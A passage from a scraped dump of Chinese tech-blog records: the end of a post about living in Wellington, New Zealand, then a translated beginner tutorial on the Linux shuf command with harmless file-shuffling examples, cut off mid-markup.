target=\"_blank\">https://vimeo.com/165066759</a><br>\n<a href=\"http://www.yourlocaldoctor.co.nz/Usefullinks.aspx\" target=\"_blank\">http://www.yourlocaldoctor.co.nz/Usefullinks.aspx</a><br>\n查询是否有资格享受公费医疗条件<br>\n<a href=\"http://www.health.govt.nz/eligibility\" target=\"_blank\">www.health.govt.nz/eligibility</a><br>\n健康站 查找可用的家庭医生<br>\n<a href=\"http://www.healthpoint.co.nz%20\" target=\"_blank\">www.healthpoint.co.nz </a><br>\n公民咨询局<br>\n<a href=\"http://www.cab.org.nz\" target=\"_blank\">www.cab.org.nz</a> Citizens Advice Bureau 0800788877 多语言服务热线</p>\n<p>放几张图吧：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/2338372c99834ed4bf20a3c9d84619a4.jpg\" alt=\"\" width=\"683\" height=\"386\"></p>\n<p>俯瞰惠灵顿</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/192779c68a35c84970e2c892a0658cf1.jpg\" alt=\"\" width=\"683\" height=\"386\"></p>\n<p>周日海边的菜市场</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/80962cab87e682fdd015f754960a5743.jpg\" alt=\"\" width=\"685\" height=\"387\"></p>\n<p>惠灵顿海边</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/de613e96b82519e4bfd100a9637bcb63.jpg\" alt=\"\" width=\"685\" height=\"387\"></p>\n<p>惠灵顿海边</p>\n<p>这边气候比较多变，经常下雨，风有时候也挺大，不过天是真真真真真蓝蓝蓝蓝啊。</p>\n<p>另外再打个广告，2018年度的假期打工签证6月21日开抢，中国每年有1000个名额，年龄30岁以下的可以尝试申请这个签证，拿这个签证也可以在新西兰合法工作（只能短期）和学习。群里不少朋友是靠这个签证来到新西兰找到工作并定居的。如果有兴趣了解的朋友，可以给我发消息。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113987\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113987votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113987\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "在国外,新西兰,移民", "url": "http://blog.jobbole.com/113987/", "url_obj_id": "57606b7f23e9680d531bf21cd6736b58"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "title": "给初学者看的 shuf 命令教程", "create_date": "2018/05/14 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/the-shuf-command-tutorial-with-examples-for-beginners/\">Sk</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9635-1.html\">Linux中国/geekpi</a>   </div><p><code>shuf</code> 命令用于在类 Unix 操作系统中生成随机排列。使用 <code>shuf</code> 命令，我们可以随机打乱给定输入文件的行。<code>shuf</code> 命令是 GNU Coreutils 的一部分，因此你不必担心安装问题。在这个简短的教程中，让我向你展示一些 <code>shuf</code> 命令的例子。</p>\n<div id=\"article_content\">\n<h3 id=\"toc_1\">带例子的 shuf 命令教程</h3>\n<p>我有一个名为 <code>ostechnix.txt</code> 的文件，内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f6c647968572\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cat ostechnix.txt\r\nline1\r\nline2\r\nline3\r\nline4\r\nline5\r\nline6\r\nline7\r\nline8\r\nline9\r\nline10\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f6c647968572-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f6c647968572-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f6c647968572-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f6c647968572-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f6c647968572-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f6c647968572-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f6c647968572-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f6c647968572-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f6c647968572-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f6c647968572-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f6c647968572-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f6c647968572-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f6c647968572-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f6c647968572-2\"><span class=\"crayon-e\">line1</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f6c647968572-3\"><span class=\"crayon-e\">line2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f6c647968572-4\"><span class=\"crayon-e\">line3</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f6c647968572-5\"><span class=\"crayon-e\">line4</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f6c647968572-6\"><span class=\"crayon-e\">line5</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f6c647968572-7\"><span class=\"crayon-e\">line6</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f6c647968572-8\"><span class=\"crayon-e\">line7</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f6c647968572-9\"><span class=\"crayon-e\">line8</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f6c647968572-10\"><span class=\"crayon-e\">line9</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f6c647968572-11\"><span class=\"crayon-i\">line10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f6c647968572-12\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>现在让我们以随机顺序显示上面的行。为此，请运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f75035791030\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ shuf ostechnix.txt\r\nline2\r\nline8\r\nline5\r\nline10\r\nline7\r\nline1\r\nline4\r\nline6\r\nline9\r\nline3\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f75035791030-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f75035791030-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f75035791030-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f75035791030-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f75035791030-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f75035791030-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f75035791030-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f75035791030-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f75035791030-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f75035791030-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f75035791030-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f75035791030-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f75035791030-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">shuf </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f75035791030-2\"><span class=\"crayon-e\">line2</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f75035791030-3\"><span class=\"crayon-e\">line8</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f75035791030-4\"><span class=\"crayon-e\">line5</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f75035791030-5\"><span class=\"crayon-e\">line10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f75035791030-6\"><span class=\"crayon-e\">line7</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f75035791030-7\"><span class=\"crayon-e\">line1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f75035791030-8\"><span class=\"crayon-e\">line4</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f75035791030-9\"><span class=\"crayon-e\">line6</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f75035791030-10\"><span class=\"crayon-e\">line9</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f75035791030-11\"><span class=\"crayon-i\">line3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f75035791030-12\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>看到了吗？上面的命令将名为 <code>ostechnix.txt</code> 中的行随机排列并输出了结果。</p>\n<p>你可能想将输出写入另一个文件。例如，我想将输出保存到 <code>output.txt</code> 中。为此，请先创建 <code>output.txt</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f79802789672\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ touch output.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f79802789672-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f79802789672-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f79802789672-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">touch </span><span class=\"crayon-v\">output</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f79802789672-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>然后，像下面使用 <code>-o</code> 标志将输出写入该文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f7c697096668\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ shuf ostechnix.txt -o output.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f7c697096668-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f7c697096668-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f7c697096668-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">shuf </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">output</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f7c697096668-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>上面的命令将随机随机打乱 <code>ostechnix.txt</code> 的内容并将输出写入 <code>output.txt</code>。你可以使用命令查看 <code>output.txt</code> 的内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f80967669026\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cat output.txt\r\n\r\nline2\r\nline8\r\nline9\r\nline10\r\nline1\r\nline3\r\nline7\r\nline6\r\nline4\r\nline5\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f80967669026-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f80967669026-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f80967669026-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f80967669026-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f80967669026-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f80967669026-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f80967669026-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f80967669026-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f80967669026-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f80967669026-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f80967669026-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f80967669026-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f80967669026-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f80967669026-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">output</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f80967669026-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f80967669026-3\"><span class=\"crayon-e\">line2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f80967669026-4\"><span class=\"crayon-e\">line8</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f80967669026-5\"><span class=\"crayon-e\">line9</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f80967669026-6\"><span class=\"crayon-e\">line10</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f80967669026-7\"><span class=\"crayon-e\">line1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f80967669026-8\"><span class=\"crayon-e\">line3</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f80967669026-9\"><span class=\"crayon-e\">line7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f80967669026-10\"><span class=\"crayon-e\">line6</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f80967669026-11\"><span class=\"crayon-e\">line4</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f80967669026-12\"><span class=\"crayon-i\">line5</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f80967669026-13\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>我只想显示文件中的任意一行。我该怎么做？很简单！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f83571984318\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ shuf -n 1 ostechnix.txt\r\nline6\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr 